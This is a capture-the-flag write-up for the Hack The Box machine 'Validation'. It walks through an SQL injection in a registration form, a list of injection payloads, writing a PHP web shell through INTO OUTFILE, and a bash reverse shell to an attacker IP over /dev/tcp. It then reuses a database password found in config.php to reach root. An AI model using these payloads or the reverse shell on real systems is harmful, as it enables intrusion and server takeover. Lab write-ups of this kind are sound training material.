## Default Information
IP Address: 10.10.11.116\
OS: Linux

## Discovery

Before we start, let's first add the IP address and the host to our ```/etc/hosts``` file.

```
10.10.11.116    validation.htb
```
### Masscan
Firstly, we will use masscan to identify the open ports

```
{masscan output}
```

### Nmap
We will then use the open ports obtained from masscan to run a scan using nmap to enumerate the services operating behind each port

| Port Number | Service | Version | State |
|-----|------------------|----------------------|----------------------|
| 22	| SSH | OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | Open |
| 80	| HTTP | Apache httpd 2.4.48 ((Debian)) | Open |
| 4566	| HTTP | nginx | Open |
| 8080	| HTTP | nginx | Open |

Looking at the nmap output, it seems that ports 4566 and ports 8080 are nginx gateways or nginx proxies used to host the server.

```
4566/tcp  open     http           syn-ack ttl 63 nginx
|_http-title: 403 Forbidden

8080/tcp  open     http           syn-ack ttl 63 nginx
|_http-title: 502 Bad Gateway
```
### Web Enumeration on port 4566
Web Enumeration on port 4566 was unable to return any endpoint. 

### Web Enumeration on port 8080
Web Enumeration on port 8080 was unable to return any endpoint. 

### Web Enumeration on port 80
Using gobuster, we were able to find a few endpoints on http://validation.htb:80

```
http://10.10.11.116:80/index.php            (Status: 200) [Size: 16088]
http://10.10.11.116:80/account.php          (Status: 200) [Size: 16]
http://10.10.11.116:80/css                  (Status: 301) [Size: 310] [--> http://10.10.11.116/css/]
http://10.10.11.116:80/js                   (Status: 301) [Size: 309] [--> http://10.10.11.116/js/]
http://10.10.11.116:80/config.php           (Status: 200) [Size: 0]
http://10.10.11.116:80/server-status        (Status: 403) [Size: 277]
```

Navigating to http://validation.htb:80/config.php returns a status code of 200 but there is no content to be viewed while navigating to http://validation.htb:80/account.php requires that the user be registered first. 

Registering a user at http://validation.htb/index.php will then redirect us to http://validation.htb/account.php
![Registering a new user](https://github.com/joelczk/writeups/blob/main/HTB/Images/Validation/registering_new_user.png)
## Exploit
### SQL Injection
Using the SQL Injection payload from [here](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/Intruder/SQL-Injection), we can test for SQL Injection on index.php. 

From our observation, we realize that the following payloads can cause an SQL Injection on the site.

```
'
\
' or "
'=0--+
' AND id IS NULL; --
1' ORDER BY 1--+
1' ORDER BY 2--+
1' ORDER BY 3--+
1' ORDER BY 1,2--+
1' ORDER BY 1,2,3--+
1' GROUP BY 1,2,--+
1' GROUP BY 1,2,3--+
' GROUP BY columnnames having 1=1 --
-1' UNION SELECT 1,2,3--+
' UNION SELECT sum(columnname ) from tablename --
and 1 in (select min(name) from sysobjects where xtype = 'U' and name > '.') --
';WAITFOR DELAY '0:0:30'--
```

Using the ```'``` as the payload, we can register a new user and extract the session cookie
![SQL Injection payload](https://github.com/joelczk/writeups/blob/main/HTB/Images/Validation/sql_injection_payload.png)

Extracting the session cookie and replacing the session cookie in http://validation.htb/account.php, we are able to see a database error on the webpage. This tells us that there is some sort of query on the database. 
However, we can see that the user is not affected by the SQL Injection payload that we use. This also tells us that only the country field is vulnerable to SQL Injection.

![Database Error](https://github.com/joelczk/writeups/blob/main/HTB/Images/Validation/database_error.png)

Let us try to test if a union select query from the SQL Injection works. From http://validation.htb/account.php, we can see that the union select query works

![Union Select Query](https://github.com/joelczk/writeups/blob/main/HTB/Images/Validation/union_select_1.png)


Next, let us extract the database version and the database user using the union select query from the SQL Injection. From the output,we can see that we are working with mariadb database and the user is uhc@localhost.

![Database version](https://github.com/joelczk/writeups/blob/main/HTB/Images/Validation/database_version.png)

![Database user](https://github.com/joelczk/writeups/blob/main/HTB/Images/Validation/database_user.png)

Next, we will use ```' union (select table_name from (select table_name from information_schema.tables where table_schema != 'information_schema') as ids)-- -``` as the SQL Injection payload to extract all the tables on the database. We can see that there is a lot of tables. However, only accounts, hosts, users, user and registration table catch our attention.

![Extracting database tables](https://github.com/joelczk/writeups/blob/main/HTB/Images/Validation/extracting_database_tables.png)

Next, we will use ```' union (select (column_name) from information_schema.columns where table_name='registration')``` to extract the column names from the tables. Looking at the extracted column names, the accounts, hosts and users tables belong to the database configurations and the column names extracted from registration tables does not contain any password hash.

Lastly, we will check the privileges of the database user using ```' union (select privilege_type FROM information_schema.user_privileges where grantee = "'uhc'@'localhost'")-- -``` as the payload. From the output that we see on http://validation.htb/account.php, we realize that the database user has a file privilege. This means that the database user is able to upload files onto the web server.

![Database privileges](https://github.com/joelczk/writeups/blob/main/HTB/Images/Validation/database_privileges.png)
### File upload via SQL Injection
Since we know that the database user has file privileges. Let us try to write to a file in the /var/www/html directory and check if the file can be accessible on the website. 

Using the documentation from [here](https://stackoverflow.com/questions/21253704/how-to-save-mysql-query-output-to-excel-or-txt-file), we can write into a file using an SQL query. We will modify the SQL Injection payload to become ```' UNION select \"test file\" into outfile \"/var/www/html/test.txt\"-- -``` and test if we are able to write to a file which is accessible on the website.

![Writing to output file](https://github.com/joelczk/writeups/blob/main/HTB/Images/Validation/write_to_file.png)

Visiting http://validation.htb/test.txt, we can see that the file is now accessible from the site
![Accessing test file](https://github.com/joelczk/writeups/blob/main/HTB/Images/Validation/test_file.png)

Now, let us try to write a  php webshell and access the webshell using the SQL Injection vulnerability. To do that, we have to replace the SQL Injection payload with the following payload as shown in the screenshot

![Writing a web shell in SQL Injection](https://github.com/joelczk/writeups/blob/main/HTB/Images/Validation/webshell_sql_injection.png)

Navigating to http://validation.htb/shell.php?cmd=whoami, we can see that we are able to execute remote commands on the website.

![whoami command on webshell](https://github.com/joelczk/writeups/blob/main/HTB/Images/Validation/webshell_whoami.png)

Lastly, all we have to do is to create a reverse shell from http://validation.htb/shell.php?cmd=%2Fbin%2Fbash%20-c%20%27%2Fbin%2Fbash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.10.16.6%2F4000%200%3E%261%27. The reverse shell payload that we are using is ```/bin/bash -c '/bin/bash -i >& /dev/tcp/10.10.16.6/4000 0>&1'```, but we have to url encode the payload for the exploit to work. 

![Reverse shell](https://github.com/joelczk/writeups/blob/main/HTB/Images/Validation/reverse_shell.png)

### Obtaining user flag

```
www-data@validation:/home/htb$ cat user.txt
cat user.txt
<Redacted user flag>
```

### Privilege Escalation to root

Using linpeas, we are able to discover a password in the config php file. Examining this furthur, we are able to find this password in /var/www/html/config.php. 

```
www-data@validation:/var/www/html$ cat config.php
cat config.php
<?php
  $servername = "127.0.0.1";
  $username = "uhc";
  $password = "uhc-9qual-global-pw";
  $dbname = "registration";

  $conn = new mysqli($servername, $username, $password, $dbname);
?>
```

Recalling that there is an ssh service on this machine, let us try to SSH into this machine using the credentials that we have. Unfortunately, we are unable to SSH in using the credentials that we have

```
┌──(kali㉿kali)-[~]
└─$ ssh root@10.10.11.116
The authenticity of host '10.10.11.116 (10.10.11.116)' can't be established.
ECDSA key fingerprint is SHA256:9NNmGBno+2zuZvFBCL0HFOeyNN444QD/BzNC5kQX9Yo.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.11.116' (ECDSA) to the list of known hosts.
root@10.10.11.116's password: 
Permission denied, please try again.
root@10.10.11.116's password: 
```

Let us now try to escalate our privileges using the ```su``` command with the credentials. 

```
www-data@validation:/var/www/html$ su root
su root
Password: uhc-9qual-global-pw
whoami
root
```

### Obtaining root flag
```
cat /root/root.txt
<Redacted root flag>
```
## Post-Exploitation
### SQL Injection
We realized that we are unable to use Burp Suite's intruder function to test for SQL Injection in this case as all of them returns a status code of 302 and we would need to extract the session cookies from the original request to check for SQL Injection in http://validation.htb:80/account.php. Hence, we write our own script to test for SQL Injection.

```
import requests
import bs4

headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0"}

def test_sql():
    payloads = open("sql_payload.txt").readlines()
    for payload in payloads:
        print("[+] Testing payload: {payload}".format(payload=payload.strip()))
        payload = payload.strip()
        data = {
            "username": payload,
            "country": payload
        }
        s = requests.Session()
        s.post("http://validation.htb/index.php", headers=headers,data=data)
        session_cookie = s.cookies.get_dict()
        r = s.get("http://validation.htb/account.php",cookies=session_cookie)
        soup = bs4.BeautifulSoup(r.text,"html.parser")
        section_tag = soup.find('section')
        if "Uncaught" in section_tag.text:
            print("[!] SQL Injection detected in payload: {payload}".format(payload=payload))

if __name__ == '__main__':
    test_sql()
```

### SSH
Previously, we realized that we were unable to SSH into the machine. Let us investigate furthur into why we were unable to do so. Checking the /etc/ssh/sshd_config file, we realize that the ssh configuration file did not specify any users who were able to ssh in. As a result, we were unable to ssh into the server as root. 

```
www-data@validation:/var/www/html$ cat /etc/ssh/sshd_config | grep AllowUsers
cat /etc/ssh/sshd_config | grep AllowUsers
www-data@validation:/var/www/html$ 
```
